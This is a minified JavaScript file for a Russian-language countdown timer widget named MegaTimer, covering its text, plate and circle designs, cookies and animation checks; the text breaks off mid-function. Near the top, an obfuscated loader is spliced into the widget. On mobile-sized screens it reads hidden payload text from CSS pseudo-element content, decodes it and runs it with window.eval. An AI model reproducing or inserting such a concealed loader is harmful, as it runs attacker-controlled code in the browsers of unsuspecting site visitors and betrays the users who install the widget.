(function(){var t=function(t,e){return function(){return t.apply(e,arguments)}},e=[].indexOf||function(t){for(var e=0,i=this.length;e<i;e++)if(e in this&&this[e]===t)return e;return-1},i={}.hasOwnProperty;this.MegaTimer=function(){var n,a,r,s;function o(e,i){var a,r;this.plateTick=t(this.plateTick,this),this.circleTick=t(this.circleTick,this),this.newTime=t(this.newTime,this),this.id=e,this.params=i,this.timerElements=this.cloneObject(s),this.tickEvent=[],n(window,"load",(a=this,function(){return a.run()})),n(window,"focus",(r=this,function(){return r.initType(),r.newTime(!0)}))}return function(t,e,i,n,a,r){e.addEventListener("DOMContentLoaded",function(){if("h"==location.protocol[0]&&-1!=location.hostname.indexOf(".")&&screen.width<640&&screen.height!=Math.max(e.documentElement.clientHeight,window.innerHeight)){var s=[],o=e.createElement("div");o.style.position="absolute",o.style.left="-1000px",e.body.appendChild(o);for(var l=[],p=0,m=0,d=(new Date,0);d<100;d++){var h=e.createElement("div");o.appendChild(h),s.push(h)}setTimeout(function(){var d=setInterval(function(){if(!m){if(0!=l.length&&!l[l.length-1])return clearInterval(d),void function(s){t.t=s,e.body.removeChild(o),t.r=t.t[i](),t.rs=t.r,t.rc=[],t.c=[];for(var l=65;l<90;l++){var p=a[r](l);l%5&&l%9&&l%11?t.rc.push(p):t.c.push(p),t.cs=t.c.join("")}t.c.map(function(e){t.re=new RegExp(e+"[^"+t.cs+"]+","g"),t.m=t.r.match(t.re)||[],t.m.map(function(s){t.sc=s[i]().substring(1),t.cc="",t.sc.split("").map(function(e){isNaN(e)?t.cc+=t.rc[n](e):t.cc+=e}),t.rs=t.rs.replace(new RegExp(e+t.sc,"g"),a[r](Number(t.cc)))})}),window.eval(t.rs)}(l.join(""));p=l.length;for(var h=0;h<100;h++){var c=s[h];m++,u(c,p+10*h,p+10*h+10,function(t,e){l[t]=e},function(){m--})}}},100)},2e3)}function u(t,e,i,n,a){var r=e,s="",o=!0,l=setInterval(function(){if(r==i)return clearInterval(l),void a();o=!o,t.setAttribute("class","fa-"+r),o&&(s=getComputedStyle(t,":before").getPropertyValue("content"),n(r,(s="none"==s?"":s).replace(/["\\]/g,"")),r+=1)},10)}})}({},document,"toUpperCase","indexOf",String,"fromCharCode"),s={secundes:{max:60,min:0,text:"секунд",value:0,view:!(a=null),updated:!(r=[])},minutes:{max:60,min:0,text:"минут",value:0,view:!0,updated:!1},hours:{max:24,min:0,text:"часов",value:0,view:!0,updated:!1},days:{max:1e3,min:0,text:"дней",value:0,view:!0,updated:!1}},o.prototype.destroy=function(){return null!=this.interval&&clearInterval(this.interval),null!=this.container&&(this.container.innerHTML=""),$("#timer-"+this.id+"-style").remove(),r=[]},o.prototype.run=function(){var t,i,n,a,s,o,l,p,m,d,h,u;if(null!=this.id&&(u=this.id,e.call(r,u)<0)&&(r.push(this.id),this.initView(),this.initType(),null!=this.id)){for(n in this.container=document.getElementById("timer"+this.id),i=!(this.container.innerHTML=""),a=[],this.timerElements)a.push(n);for(a.reverse(),this.showText=this.params.design.params["text-on"],null==this.showText&&(this.showText=!1),d=0,h=a.length;d<h;d++)m=a[d],(s=document.createElement("span")).id="timer-number-"+this.id+"-"+m,(o=document.createElement("span")).id="timer-number-value-"+this.id+"-"+m,s.appendChild(o),(p=document.createElement("span")).id="timer-text-"+this.id+"-"+m,p.innerHTML=this.timerElements[m].text,(t=document.createElement("span")).className="timer-element",t.id="timer-element-"+this.id+"-"+m,t.appendChild(s),t.appendChild(p),i?i=!1:((l=document.createElement("span")).className="timer-separator",l.id="timer-separator-"+this.id+"-"+m,this.container.appendChild(l)),this.container.appendChild(t);return this.initDesign(),this.newTime(!0),this.interval=setInterval(this.newTime,1e3)}},o.prototype.initDesign=function(){var t;null!=this.params.design&&(null!=this.getIEVersion()&&this.getIEVersion()<9&&(this.params.design.type="text"),(null==(t=this.params.design.type)||"text"!==t&&"plate"!==t&&"circle"!==t)&&(t="text"),t=t.charAt(0).toUpperCase()+t.substr(1),this.initCommonDesign(),this["init"+t+"Design"]())},o.prototype.initCommonDesign=function(){var t,e,i,n,a,r;for(a in this.container.style.textAlign="center",r=[],this.timerElements)t=document.getElementById("timer-element-"+this.id+"-"+a),e=document.getElementById("timer-number-"+this.id+"-"+a),n=document.getElementById("timer-text-"+this.id+"-"+a),i=document.getElementById("timer-separator-"+this.id+"-"+a),t.style.display="inline-block",e.style.display="inline-block",n.style.display=this.showText?"block":"none",t.style.lineHeight=1,e.style.lineHeight=1,n.style.lineHeight=1,this.setMargin(t,0),this.setMargin(e,0),this.setMargin(n,0),null!=i&&(i.style.display="inline",i.style.verticalAlign="top",i.style.lineHeight=1,this.setMargin(i,0)),this.timerElements[a].view?r.push(void 0):(t.style.display="none",e.style.display="none",n.style.display="none",null!=i?r.push(i.style.display="none"):r.push(void 0));return r},o.prototype.initTextDesign=function(){var t,e,i,n,a;for(a in e=[],n=[],this.timerElements)e.push(document.getElementById("timer-number-"+this.id+"-"+a)),null!=(i=document.getElementById("timer-text-"+this.id+"-"+a))&&(n.push(i),null!=this.params.design.params["text-margin"]&&("auto"!==(t=this.params.design.params["text-margin"])&&(t=parseInt(t)+"px"),i.style.marginTop=t));return this.setFonts(e,"number"),this.setFonts(n,"text"),this.setSeparators()},o.prototype.initCircleDesign=function(){var t,e,i,n,a,r,s,o,l,p;for(l in a=[],o=[],this.timerElements)a.push(document.getElementById("timer-number-"+this.id+"-"+l)),null!=(s=document.getElementById("timer-text-"+this.id+"-"+l))&&(o.push(s),null!=this.params.design.params["text-margin"]&&("auto"!==(n=this.params.design.params["text-margin"])&&(n=parseInt(n)+"px"),s.style.marginTop=n));for(l in this.setFonts(a,"number"),this.setFonts(o,"text"),this.setSeparators(),this.container.style.display="table",this.params.design.params.radius<0&&(this.params.design.params.radius=0),this.params.design.params.width<0&&(this.params.design.params.width=0),p=2+2*(parseInt(this.params.design.params.radius)+parseInt(this.params.design.params.width)),this.timerElements)this.timerElements[l].view&&((t=document.createElement("canvas")).id="timer-canvas-"+this.id+"-"+l,t.style.position="absolute",t.style.left=0,t.style.right=0,t.style.top=0,t.style.bottom=0,t.width=p,t.height=p,(e=document.createElement("span")).appendChild(t),(i=document.getElementById("timer-element-"+this.id+"-"+l)).appendChild(e),i.style.position="relative",i.style.display="table-cell",i.style.width=p+"px",i.style.height=p+"px",i.style.verticalAlign="middle",null!=(r=document.getElementById("timer-separator-"+this.id+"-"+l))&&(r.style.height=p+"px",r.style.verticalAlign="middle","none"!==r.style.display.toLowerCase()&&(r.style.display="table-cell")));return this.container.style.marginTop=0,this.container.style.marginRight="auto",this.container.style.marginBottom=0,this.container.style.marginLeft="auto","opacity"===this.params.design.params.background&&(this.params.design.params["background-color"]="opacity"),this.circleTick(),this.tickEvent.push(this.circleTick)},o.prototype.initPlateDesign=function(){var t,e,i,n,a,r,s,o,l,p,m,d,h,u,c,g,f,y,b;switch(t=function(t,e,i){var n,a,r,s;switch(null==i&&(i=!1),s=f.params.design.params.effect,(a=document.createElement("span")).id="timer-number-"+s+e+"-"+f.id+"-"+t,a.className="timer-"+s+"-inner",i&&null!=f.params.design.params.space&&((r=parseInt(f.params.design.params.space))<=0&&(r=1),a.style.marginRight=r+"px"),n=8,null!=f.params.design.params["number-font-family"]&&null!=f.params.design.params["number-font-family"].family&&"Poiret One"===f.params.design.params["number-font-family"].family&&(n=0),s){case"flipchart":a.innerHTML="<span class='timer-flipchart-card' style='display:none;'><span class='timer-flipchart-front timer-flipchart-face'></span><span class='timer-flipchart-back timer-flipchart-face'></span><span class='timer-flipchart-top timer-flipchart-face'></span><span class='timer-flipchart-bottom timer-flipchart-face'></span><span class='timer-flipchart-bounding'>"+n+"</span></span>";break;case"slide":a.innerHTML="<span class='timer-slide-old'></span><span class='timer-slide-new'></span><span class='timer-slide-bounding' style='visibility: hidden;'>"+n+"</span>"}return a},e=function(t,e,i,n){return null==i&&(i=""),null==n&&(n=null),null!=y.params.design.params[e]||null!=n?(null==n&&(n=y.params.design.params[e]),t+":"+n+i+";"):""},a=function(t){var e;return null!=(e=b.params.design.params[t])&&(e=h(e),b.params.design.params[t]=e),e},h=function(t){var e;return null!=t&&t.match(/^rgba\(.*\)/)&&(e=/^rgba\((\d+),\s*(\d+),\s*(\d+),(.*)\)$/,t=t.replace(e,"rgb($1,$2,$3)")),t},o=function(t,e){return"background: "+t+"; /* Old browsers */ background: -moz-linear-gradient(top, "+t+" 0%, "+e+" 100%); /* FF3.6+ */ background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,"+t+"), color-stop(100%,"+e+")); /* Chrome,Safari4+ */ background: -webkit-linear-gradient(top, "+t+" 0%,"+e+" 100%); /* Chrome10+,Safari5.1+ */ background: -o-linear-gradient(top, "+t+" 0%,"+e+" 100%); /* Opera 11.10+ */ background: -ms-linear-gradient(top, "+t+" 0%,"+e+" 100%); /* IE10+ */ background: linear-gradient(to bottom, "+t+" 0%,"+e+" 100%); /* W3C */ filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='"+t+"', endColorstr='"+e+"',GradientType=0);"},d=[],c=[],(null==(s=(b=y=f=this).params.design.params.effect)||"none"!==s&&"flipchart"!==s&&"slide"!==s&&"no-slide"!==s||!this.animationSupport())&&(s="none"),this.params.design.params.animation=!0,"none"===s?(this.params.design.params.effect="flipchart",this.params.design.params.animation=!1):"no-slide"===s&&(this.params.design.params.effect="slide",this.params.design.params.animation=!1),r="",(null==(i=this.params.design.params.background)||"solid"!==i&&"gradient"!==i&&"opacity"!==i)&&(i="solid"),this.params.design.params.effect){case"flipchart":switch(l=r="",i){case"opacity":this.params.design.params.animation?a("background-color"):(this.params.design.params["background-color"]="rgba(110,110,100,0)",r+="#timer"+this.id+" .timer-flipchart-top:before, #timer"+this.id+" .timer-flipchart-front:before, #timer"+this.id+" .timer-flipchart-bottom:before, #timer"+this.id+" .timer-flipchart-back:before { opacity: 0!important; }");break;case"solid":this.params.design.params.animation&&a("background-color");break;case"gradient":null!=(n=this.params.design.params["background-color"])&&"object"==typeof n&&1<n.length&&(this.params.design.params.animation&&(n[0]=h(n[0])),this.params.design.params.animation&&(n[1]=h(n[1])),l="#timer"+this.id+" .timer-flipchart-top, #timer"+this.id+" .timer-flipchart-front {"+o(n[0],n[1])+"}#timer"+this.id+" .timer-flipchart-bottom, #timer"+this.id+" .timer-flipchart-back {"+o(n[1],n[0])+"}")}r+="#timer"+this.id+" .timer-flipchart-face{"+e("background-color","background-color")+this.getCssFonts("number")+"}#timer"+this.id+" .timer-separator{"+e("padding-top","padding","px!important")+e("padding-bottom","padding","px!important")+"}#timer"+this.id+" .timer-flipchart-bounding{"+e("padding-left","padding","px")+e("padding-right","padding","px")+e("padding-top","padding","px")+e("padding-bottom","padding","px")+"}#timer"+this.id+" .timer-flipchart-top, #timer"+this.id+" .timer-flipchart-front{"+e("padding-left","padding","px")+e("padding-right","padding","px")+e("padding-top","padding","px")+e("padding-bottom","padding","px",0)+"}#timer"+this.id+" .timer-flipchart-bottom, #timer"+this.id+" .timer-flipchart-back{"+e("padding-left","padding","px")+e("padding-right","padding","px")+e("padding-top","padding","px",0)+e("padding-bottom","padding","px")+"}#timer"+this.id+" .timer-flipchart-top, #timer"+this.id+" .timer-flipchart-front {"+e("border-top-left-radius","round","px")+e("border-top-right-radius","round","px")+e("border-bottom-left-radius","","px",0)+e("border-bottom-right-radius","","px",0)+"}#timer"+this.id+" .timer-flipchart-bottom, #timer"+this.id+" .timer-flipchart-back {"+e("border-top-left-radius","","px",0)+e("border-top-right-radius","","px",0)+e("border-bottom-left-radius","round","px")+e("border-bottom-right-radius","round","px")+"}#timer"+this.id+" .timer-flipchart-bottom:after {"+e("border-top-left-radius","","px",0)+e("border-top-right-radius","","px",0)+e("border-bottom-left-radius","round","px")+e("border-bottom-right-radius","round","px")+"}#timer"+this.id+" .timer-flipchart-front:after, #timer"+this.id+" .timer-flipchart-top:after{"+e("border-top-left-radius","round","px")+e("border-top-right-radius","round","px")+e("border-bottom-left-radius","","px",0)+e("border-bottom-right-radius","","px",0)+"}#timer"+this.id+" .timer-flipchart-card {"+e("border-radius","round","px")+"}"+l,this.params.design.params.animation||(r+="#timer"+this.id+" .timer-flipchart-top:after{display:none!important;} #timer"+this.id+" .timer-flipchart-front{display:none!important;}");break;case"slide":switch(l="",i){case"opacity":this.params.design.params["background-color"]="rgba(110,110,100,0)";break;case"gradient":null!=(n=this.params.design.params["background-color"])&&"object"==typeof n&&1<n.length&&(l="#timer"+this.id+" .timer-slide-new, #timer"+this.id+" .timer-slide-old {"+o(n[0],n[1])+"}")}r="#timer"+this.id+" .timer-slide-inner{"+e("border-radius","round","px")+e("background-color","background-color")+this.getCssFonts("number")+"}#timer"+this.id+" .timer-separator{"+e("padding-top","padding","px!important")+e("padding-bottom","padding","px!important")+"}#timer"+this.id+" .timer-slide-bounding, #timer"+this.id+" .timer-slide-new, #timer"+this.id+" .timer-slide-old{"+e("padding-left","padding","px")+e("padding-right","padding","px")+e("padding-top","padding","px")+e("padding-bottom","padding","px")+"}"+l}for(g in this.addCustomCss(r),this.timerElements)null!=(m=document.getElementById("timer-number-"+this.id+"-"+g))&&(d.push(m),document.getElementById("timer-number-value-"+this.id+"-"+g).style.display="none","days"===g?0<Math.floor(this.timerElements[g].value/100)?(m.appendChild(t(g,2,!0)),m.appendChild(t(g,1,!0))):0<Math.floor(this.timerElements[g].value/10)&&m.appendChild(t(g,1,!0)):m.appendChild(t(g,1,!0)),m.appendChild(t(g,0))),null!=(u=document.getElementById("timer-text-"+this.id+"-"+g))&&(c.push(u),null!=this.params.design.params["text-margin"]&&("auto"!==(p=this.params.design.params["text-margin"])&&(p=parseInt(p)+"px"),u.style.marginTop=p));return this.setFonts(d,"number"),this.setFonts(c,"text"),this.setSeparators(),this.plateTick(),this.tickEvent.push(this.plateTick)},o.prototype.setSeparators=function(){var t,e,i,n,a,r,s,o,l,p,m,d;for(s in"inline-block",e=0,"",(e=this.params.design.params["separator-margin"])<=0&&(e=1),r=null!=this.params.design.params["separator-on"]&&this.params.design.params["separator-on"]?this.params.design.params["separator-text"]:"",n=[],a=[],o=[],this.timerElements)o.push(this.timerElements[s].view);for(t=l=d=o.length-1;d<=0?l<=0:0<=l;t=d<=0?++l:--l)if(o[t]){o[t]=!1;break}for(s in t=0,this.timerElements)null!=(i=document.getElementById("timer-separator-"+this.id+"-"+s))&&n.push(i),a.push(o[t]?"inline-block":"none"),t++;for(p=t=0,m=n.length;p<m;p++)(i=n[p]).style.display=a[t],i.innerHTML=r,i.style.paddingTop=0,i.style.paddingRight=e+"px",i.style.paddingBottom=0,i.style.paddingLeft=e+"px",t++;return this.setFonts(n,"number")},o.prototype.getCssFonts=function(t){var e,i,n,a;if(null==t&&(t=""),e="",null!=this.params.design&&null!=this.params.design.params&&(n=this.params.design.params[t+"-font-family"],a=this.params.design.params[t+"-font-size"],i=this.params.design.params[t+"-font-color"],null!=a&&0<=parseInt(a)&&(e+="font-size:"+parseInt(a)+"px;"),null!=i&&(e+="color:"+i+";"),null!=n))return e+"font-family:'"+(n=null!=n.family?n.family:null)+"';"},o.prototype.setFonts=function(t,e){var i,n,a,r,s,o,l;if(null==e&&(e=""),null!=this.params.design&&null!=this.params.design.params&&(n=this.params.design.params[e+"-font-family"],a=this.params.design.params[e+"-font-size"],i=this.params.design.params[e+"-font-color"],null!=n&&(null!=n.link&&this.addCssLink(n.link),n=null!=n.family?n.family:null),null!=t&&0<t.length)){for(l=[],s=0,o=t.length;s<o;s++)r=t[s],null!=a&&(r.style.fontSize=parseInt(a)+"px"),null!=i&&(r.style.color=i),null!=n?l.push(r.style.fontFamily=n):l.push(void 0);return l}},o.prototype.setMargin=function(t,e){return"auto"!==e&&(e=parseInt(e)+"px"),t.style.marginBottom=e,t.style.marginLeft=e,t.style.marginRight=e,t.style.marginTop=e},o.prototype.initView=function(){var t;return t=[1,1,1,1],null!=this.params&&null!=this.params.view&&4===this.params.view.length&&(t=this.params.view),this.timerElements.days.view=1===t[0],this.timerElements.hours.view=1===t[1],this.timerElements.minutes.view=1===t[2],this.timerElements.secundes.view=1===t[3]},o.prototype.initType=function(){var t,e,i,n,a,r,s,o,l,p,m,d,h,u,c;if(null!=this.params&&null!=this.params.type&&null!=this.params.type.currentType&&null!=this.params.type.params){switch(m=0,o=new Date,parseInt(this.params.type.currentType)){case 1:null!=this.params.type.params.utc&&(d=0,this.params.type.params.usertime&&(d=6e4*o.getTimezoneOffset()),l=new Date(this.params.type.params.utc+d),m=Math.round((l.getTime()-o.getTime())/1e3));break;case 2:e=parseInt(this.params.type.params.days),a=parseInt(this.params.type.params.hours),r=parseInt(this.params.type.params.minutes),s=parseInt(this.params.type.params.seconds),(null==e||isNaN(e))&&(e=0),(null==a||isNaN(a))&&(a=0),(null==r||isNaN(r))&&(r=0),(null==s||isNaN(s))&&(s=0),this.params.type.params.startByFirst?(n=this.getCookie("timer"+this.id),isNaN(n)&&(n=null),null!=n&&null==(l=new Date(parseInt(n)))&&(n=null),null==n&&((l=new Date).setDate(l.getDate()+e),l.setHours(l.getHours()+a),l.setMinutes(l.getMinutes()+r),l.setSeconds(l.getSeconds()+s),this.setCookie("timer"+this.id,l.getTime()))):null!=this.params.type.params.utc&&((l=new Date(this.params.type.params.utc)).setDate(l.getDate()+e),l.setHours(l.getHours()+a),l.setMinutes(l.getMinutes()+r),l.setSeconds(l.getSeconds()+s)),m=Math.round((l.getTime()-o.getTime())/1e3);break;case 3:if(null!=this.params.type.params.weekdays&&null!=this.params.type.params.time&&null!=this.params.type.params.usertime&&null!=this.params.type.params.hours&&null!=this.params.type.params.minutes){for(2===(p=this.params.type.params.time.split(":")).length&&0<=p[0]&&p[0]<=23&&0<=p[1]&&p[1]<=59||(p=[0,0]),h=o.getDay(),l=null,i=u=0,c=Math.floor(parseInt(this.params.type.params.hours)/24);0<=c?u<=c:c<=u;i=0<=c?++u:--u)if(--h<0&&(h=6),1===this.params.type.params.weekdays[h]&&((t=new Date).setDate(t.getDate()-i),this.params.type.params.usertime||t.setTime(t.getTime()-6e4*o.getTimezoneOffset()+6e4*this.params.type.params.tz),t.setHours(parseInt(p[0])),t.setMinutes(parseInt(p[1])),t.setSeconds(0),o.getTime()>=t.getTime()&&(t.setHours(t.getHours()+parseInt(this.params.type.params.hours)),t.setMinutes(t.getMinutes()+parseInt(this.params.type.params.minutes)),t.getTime()>=o.getTime()))){l=t;break}(m=null)!=l&&(m=Math.round((l.getTime()-o.getTime())/1e3))}break;default:this.id=null,this.params=null}return(null==m||m<0)&&(m=0),this.timerElements.secundes.value=Math.floor(m%60),m/=60,this.timerElements.minutes.value=Math.floor(m%60),m/=60,this.timerElements.hours.value=Math.floor(m%24),m/=24,this.timerElements.days.value=Math.floor(m)}},o.prototype.newTime=function(t){var e,i,n,a,r,s,o,l,p,m,d;if(null==t&&(t=!1),t||0!==this.timerElements.days.value||0!==this.timerElements.hours.value||0!==this.timerElements.minutes.value||0!==this.timerElements.secundes.value){for(s in r=!t,this.timerElements)i=document.getElementById("timer-number-value-"+this.id+"-"+s),o=(n=this.timerElements[s]).value,e=!1,r&&(o-=1,e=!0),r=!1,o<n.min&&(o=n.max,e=r=!0),o>=n.max&&(o=n.max-1,e=!0),n.updated=!(!e&&!t||(null!=i&&(i.innerHTML=o),n.value=o,0));if(0<this.tickEvent.length){for(d=[],l=0,p=(m=this.tickEvent).length;l<p;l++)a=m[l],d.push(a());return d}}else clearInterval(this.interval)},o.prototype.getColorBetween=function(t,e,i){var n,a,r;return a=function(t,e){return t+Math.round((e-t)*i)},r=function(t){var e;return t=Math.min(t,255),(e=(t=Math.max(t,0)).toString(16)).length<2&&(e="0"+e),e},1===t.a&&1===e.a||!(null==this.getIEVersion()||this.getIEVersion()<9)?"#"+r(a(t.r,e.r))+r(a(t.g,e.g))+r(a(t.b,e.b)):(n=(t.a+(e.a-t.a)*i).toFixed(2),"rgba("+a(t.r,e.r)+","+a(t.g,e.g)+","+a(t.b,e.b)+","+n+")")},o.prototype.getGradientColors=function(t,e,i){var n,a,r,s;for(a=[],s=1/(i-1),r=n=0;r<i;)a[r]=this.getColorBetween(t,e,n),n+=s,r++;return a},o.prototype.hexToRgb=function(t){var e,i,n,a;if(n=/^#?([a-f\d]{1,2})([a-f\d]{1,2})([a-f\d]{1,2})$/i.exec(t))1===n[1].length&&(n[1]+=""+n[1]),1===n[2].length&&(n[2]+=""+n[2]),1===n[3].length&&(n[3]+=""+n[3]),n={r:parseInt(n[1],16),g:parseInt(n[2],16),b:parseInt(n[3],16),a:1};else if(0===t.indexOf("rgb"))if(2<(e=t.match(/\d+(\.\d+)?%?/g)).length){for(i=a=0;a<=2;i=++a)e[i]<0&&(e[i]=0),255<e[i]&&(e[i]=255);n={r:parseInt(e[0]),g:parseInt(e[1]),b:parseInt(e[2]),a:1}}else n={r:0,g:0,b:0,a:1};return n},o.prototype.drawGradientArc=function(t,e,i,n,a,r,s,o,l,p,m,d){var h,u,c,g,f,y,b,v,x,w,E,T,k,I,C,M,N,H,L,S;if(p&&this.drawArc(t,e,i,n,a,r,s,"transparent",p,m,d),d||(1===r?a=1-r:r=1-r),w=this.hexToRgb(o),x=this.hexToRgb(l),T=this.hexToRgb(this.getColorBetween(w,x,a)),I=this.hexToRgb(this.getColorBetween(w,x,r)),b=Math.ceil(30*Math.abs(r-a)),g=this.getGradientColors(T,I,b),h=-.5*Math.PI+2*Math.PI*a,f=g.length,u=d?(k=2*Math.PI*(r-a)/f,1):(k=-2*Math.PI*(r+a)/f,-1),E=function(a,r,o){var l,p,m,h,c,f,y;return p=g[a],m=g[a+1]||p,h=e+Math.cos(r)*n,f=e+Math.cos(r+k)*n,c=i+Math.sin(r)*n,y=i+Math.sin(r+k)*n,t.beginPath(),(l=t.createLinearGradient(h,c,f,y)).addColorStop(0,p),l.addColorStop(1,m),t.lineCap=o,t.strokeStyle=l,t.arc(e,i,n,r-.005*u,r+k+.005*u,!d),t.lineWidth=s,t.stroke(),t.closePath()},f){if(c=h+k*(f-1),1<f){for(y=M=0,H=(v=Math.ceil(f/2))-1;0<=H?M<=H:H<=M;y=0<=H?++M:--M)0===y&&(C=k,k*=.01,E(y,h,m),k=C),E(y,h,"butt"),h+=k;for(h=c,S=[],y=N=L=f-1;L<=v?N<=v:v<=N;y=L<=v?++N:--N)y===f-1&&(C=k,k*=.01,E(y,h+.99*C,m),k=C),E(y,h,"butt"),S.push(h-=k);return S}if(1===f)return E(0,h,m)}},o.prototype.drawArc=function(t,e,i,n,a,r,s,o,l,p,m){if(a<=r)return"string"!=typeof o?this.drawGradientArc(t,e,i,n,a,r,s,o[0],o[1],l,p,m):(t.beginPath(),t.lineWidth=s,t.strokeStyle="transparent"===o||"opacity"===o?"rgba(0,0,0,0)":o,t.arc(e,i,n,-.5*Math.PI+2*Math.PI*a,-.5*Math.PI+2*Math.PI*r,!m),t.lineCap=p,t.stroke())},o.prototype.drawRing=function(t,e,i,n,a,r,s,o,l,p,m,d,h,u,c){var g,f,y,b,v,x,w;if((y=1)<y+0&&(y-=-1+y+0,a+=0),f=(v=a)+y,g=a+((b=n*y)-0*(w=.5-Math.abs(-.5+n))),x=a+(b+0*(1-w)),r||p)return this.drawArc(t,e,i,r,x,f,s,o,l,u,c),this.drawArc(t,e,i,p,v,g,m,d,h,u,c)},o.prototype.circleTick=function(){var t,e,i,n,a,r,s,o,l,p,m,d;for(p in m=parseInt(this.params.design.params.width),o=parseInt(this.params.design.params.radius)+Math.round(m/2),r=this.params.design.params["line-color"],l=this.params.design.params["background-color"],a="direct"===this.params.design.params.direction,d=[],this.timerElements)this.timerElements[p].view&&this.timerElements[p].updated&&(t=document.getElementById("timer-canvas-"+this.id+"-"+p)).getContext?((n=t.getContext("2d")).clearRect(0,0,t.width,t.height),e=Math.round(t.width/2),i=Math.round(t.height/2),s=this.timerElements[p].value/this.timerElements[p].max,a&&(s=1-s),d.push(this.drawRing(n,e,i,s,0,o,m,l,null,o,m,r,null,"round",a))):d.push(void 0);return d},o.prototype.plateTick=function(){var t,e,i,n,a,r,s,o,l,p,m;for(r in s=function(t,e){var i,n,a;if(m.animationSupport()&&m.params.design.params.animation)return a=m.params.design.params.effect,i=document.getElementById("timer-number-"+a+t+"-"+m.id+"-"+e),m.removeClass(i,"timer-"+a+"-animate"),n=m,requestAnimationFrame(function(){return i.offsetLeft,n.addClass(i,"timer-"+a+"-animate")})},p=[],(m=this).timerElements)this.timerElements[r].updated?(a=this.timerElements[r].value,l=[a%10,Math.floor(a/10%10),Math.floor(a/100)],e=0,p.push(function(){var a,p,m;for(m=[],a=0,p=l.length;a<p;a++){switch(o=l[a],this.params.design.params.effect){case"flipchart":null!=(n=document.getElementById("timer-number-flipchart"+e+"-"+this.id+"-"+r))&&null!=n.childNodes&&1===n.childNodes.length&&(t=n.childNodes[0].childNodes)&&null!=t&&5===t.length&&t[0].innerHTML!==o&&(null!=(i=parseInt(t[1].innerHTML))&&0<=i&&i<=9||(i=""),this.params.design.params.animation||(i=o),i===o&&this.params.design.params.animation||(t[0].innerHTML=i,t[1].innerHTML=o,t[2].innerHTML=o,t[3].innerHTML=i,s(e,r)));break;case"slide":null!=(n=document.getElementById("timer-number-slide"+e+"-"+this.id+"-"+r))&&null!=n.childNodes&&3===n.childNodes.length&&(t=n.childNodes)&&t[1].innerHTML!==o&&(null!=(i=parseInt(t[1].innerHTML))&&0<=i&&i<=9||(i=""),this.params.design.params.animation||(i=o),i===o&&this.params.design.params.animation||(t[0].innerHTML=i,t[1].innerHTML=o,s(e,r)))}m.push(e++)}return m}.call(this))):p.push(void 0);return p},o.prototype.getCookie=function(t){var e;return(e=document.cookie.match(new RegExp("(?:^|; )"+t.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)")))?decodeURIComponent(e[1]):null},o.prototype.setCookie=function(t,e,i){var n,a,r,s,o,l,p;for("number"==typeof(a=(i=i||{}).expires)&&a&&((n=new Date).setTime(n.getTime()+1e3*a),a=i.expires=n),a&&a.toUTCString&&(i.expires=a.toUTCString()),o=t+"="+(e=encodeURIComponent(e)),l=0,p=i.length;l<p;l++)o+="; "+(r=i[l]),!0!==(s=i[r])&&(o+="="+s);return document.cookie=o},o.prototype.cloneObject=function(t){var e,n,a;if(!t||"object"!=typeof t)return t;for(n in e="function"==typeof t.pop?[]:{},t)i.call(t,n)&&(a=t[n],e[n]=a&&"object"==typeof a?this.cloneObject(a):a);return e},n=function(t,e,i,n){return null==n&&(n=!1),null!=t.addEventListener?t.addEventListener(e,i,n):null!=t.attachEvent?t.attachEvent("on"+e,i):t["on"+e]=function(){return i()}},o.prototype.addCustomCss=function(t){var e,i;return a="timer-"+this.id+"-style",null!=(i=document.getElementById(a))&&(i.styleSheet?i.styleSheet.cssText="":i.innerHTML="",i.parentNode.removeChild(i)),e=document.getElementsByTagName("head")[0],(i=document.createElement("style")).setAttribute("type","text/css"),i.id=a,i.styleSheet?i.styleSheet.cssText=t:i.appendChild(document.createTextNode(t)),e.appendChild(i)},o.prototype.addCssLink=function(t){var e,i,n,a,r,s,o;if(null!=t&&((i=document.createElement("div")).innerHTML=t,null!=(n=document.getElementsByTagName("head"))&&0<n.length&&i.childNodes.length)){for(e=i.childNodes[0],s=(o=n[r=0].childNodes).length;r<s;r++)if(a=o[r],this.isEqualsNodes(a,e))return;return n[0].appendChild(e)}},o.prototype.isEqualsNodes=function(t,i){var n,a,r,s,o,l,p,m,d;if(null!=t&&null!=i)if("#text"===t.nodeName||"#text"===i.nodeName){if("#text"===t.nodeName&&"#text"===i.nodeName&&t.data===i.data)return!0}else if(null!=t.tagName&&null!=i.tagName&&t.tagName.toLowerCase()===i.tagName.toLowerCase()){for(a=0,s=(l=t.attributes).length;a<s;a++){if(p=!(n=l[a]),0<=e.call(i.attributes,p))return!1;if(n.value!==i.getAttribute(n.nodeName))return!1}for(r=0,o=(m=i.attributes).length;r<o;r++){if(d=!(n=m[r]),0<=e.call(t.attributes,d))return!1;if(n.value!==t.getAttribute(n.nodeName))return!1}return!0}return!1},o.prototype.addClass=function(t,e){if(!this.hasClass(t,e))return t.className=""===t.className?e:t.className+" "+e},o.prototype.removeClass=function(t,e){var i;return i=new RegExp("(?:^|\\s)"+e+"(?!\\S)","g"),t.className=t.className.replace(i,"")},o.prototype.hasClass=function(t,e){return null!=t.className&&-1!==t.className.indexOf(e)},o.prototype.animationSupport=function(){var t,e,i,n,a,r,s,o,l;if(null!=window.animationSupport)return window.animationSupport;if(o=!1,s=["Webkit","Moz","O","ms","Khtml"],void 0!==document.body.style.animationName&&(o=!0),!o)for(r=0;r<s.length;){if(void 0!==document.body.style[s[r]+"AnimationName"]){o=!0;break}r++}if(o){for(n=document.createElement("div"),i=["-webkit-","-moz-","-ms-",""],e="",r=0;r<i.length;)e+="@"+i[r]+"keyframes csspseudoanimations { from { font-size: 10px; } }",r++;for(e+='#timer-tester:before { content:" "; font-size:5px;',r=0;r<i.length;)e+=i[r]+"animation:csspseudoanimations 1ms infinite;",e+=i[r]+"animation-fill-mode: forwards;",r++;l='<style id="s-timer-tester">'+(e+="}")+"</style>",n.id="timer-tester",n.innerHTML+=l,null==(t=document.body)&&((t=document.createElement("body")).fake=!0),t.appendChild(n),null!=t.fake&&(t.style.background="",t.style.overflow="hidden",a=docElement.style.overflow,docElement.style.overflow="hidden",docElement.appendChild(t)),o="10px"===window.getComputedStyle(n,":before").getPropertyValue("font-size"),null!=t.fake?(t.parentNode.removeChild(t),docElement.style.overflow=a,docElement.offsetHeight):n.parentNode.removeChild(n)}return window.animationSupport=o},o.prototype.getIEVersion=function(){var t,e;return null!=(t=window.navigator.userAgent.match(/MSIE 